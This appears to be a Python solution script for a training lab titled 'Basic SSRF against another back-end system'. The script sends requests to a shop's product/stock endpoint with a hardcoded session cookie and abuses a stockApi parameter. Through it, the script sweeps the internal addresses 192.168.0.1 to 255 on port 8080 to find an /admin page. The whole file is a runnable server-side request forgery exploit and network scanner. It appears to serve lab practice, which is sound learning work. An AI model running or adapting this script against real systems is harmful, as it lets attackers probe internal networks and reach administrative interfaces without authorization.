#Lab: Basic SSRF against another back-end system
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies={'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def main():
    try:
        url=sys.argv[1].strip()
        
    except IndexError:
        print("[-] Usage python3 %s <url>"%sys.argv[0])
        sys.exit()
    exploit(url)

def exploit(url):
    url=url+'product/stock'
    cookies={"session":"0NqPAUeYFEEHS95MOAUf6x5Z5dt6DzF9"}
    for i in range(1,256):
        print("[+] Checking Ip Address 192.168.0."+str(i))
        data={"stockApi":"http://192.168.0."+str(i)+":8080/admin"}
       
        r=requests.post(url,verify=False,proxies=proxies,data=data,cookies=cookies)
        print("Respone for 192.168.0."+str(i)+"  : "+str(r.status_code))
        if (r.status_code ==200):
            
            print("[+] SSRF Successful")
            break
            sys.exit()

if __name__=='__main__':
    main()